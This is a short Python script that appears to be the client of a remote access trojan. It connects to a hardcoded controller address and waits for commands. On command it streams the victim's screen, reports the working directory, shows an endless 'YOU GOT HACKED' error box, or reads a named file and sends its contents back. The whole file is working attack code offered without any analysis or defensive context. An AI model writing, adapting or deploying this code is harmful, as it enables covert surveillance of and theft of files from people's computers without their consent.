import socket
from tkinter import messagebox
from vidstream import *
import os
from pymsgbox import *
import tkinter as tk
from tkinter import messagebox
from subprocess import Popen
import cv2
import turtle
import time
import random

ip = "192.168.1.209"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, 7070))



while True:
    command = s.recv(1024).decode()

    if command == "screen":
        screen = ScreenShareClient(ip, 6061)
        screen.start_stream()
    elif command == "cwd":
        files = os.getcwd()
        file = str(files)
        s.send(file.encode())
    elif command == "msgbox":
        while True:
            messagebox.showerror(
                title='👨‍💻', message='𝗬𝗢𝗨 𝗚𝗢𝗧 𝗛𝗔𝗖𝗞𝗘𝗗!!! 𝗛𝗘𝗛𝗘𝗛𝗘')
    elif command == "download_file":
        file_name = s.recv(1024).decode()
        file = open(file_name, "rb")
        data = file.read()
        s.send(data)
